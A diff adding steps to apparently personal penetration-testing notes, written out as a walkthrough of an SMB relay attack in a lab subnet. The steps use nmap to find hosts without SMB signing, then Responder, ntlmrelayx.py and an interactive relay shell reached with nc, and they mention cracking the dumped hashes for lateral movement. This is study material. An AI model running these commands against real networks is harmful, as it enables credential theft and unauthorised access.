@@ -76,4 +76,42 @@ Using nmap to do a quick check:
 
 `nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24`
 
+paste all the targets or the one doesn't require SMB signing
+
+`gedit targets.txt`
+
 **SMB Relay Attack Demonstration**
+`cat targets.txt`
+
+Now set up the responder
+
+`gedit /etc/responder/Responder.conf`
+
+turn on both SMB & HTTP save the .conf file.
+
+`responder -I eth0 -rdwv`
+
+Now set-up the relay
+
+`ntlmrelayx.py -tf targets.txt -smb2support`
+
+Now wait for a connection to happen.
+Copy and crack the hashes after dumping them.
+We might be able to move laterally/vertically with the hashes.
+Which will occur only if we have multiple admins.
+
+**SMB Relay Attack Demonstration - II**
+
+Making this shell Interactive
+
+`responder -I eth0 -rdwv`
+
+Now load up ntlmrelay
+
+`ntlmrelayx.py -tf targets.txt -smb2support -i`
+
+Open a new tab;
+
+`nc 127.0.0.1 11000`
+
+
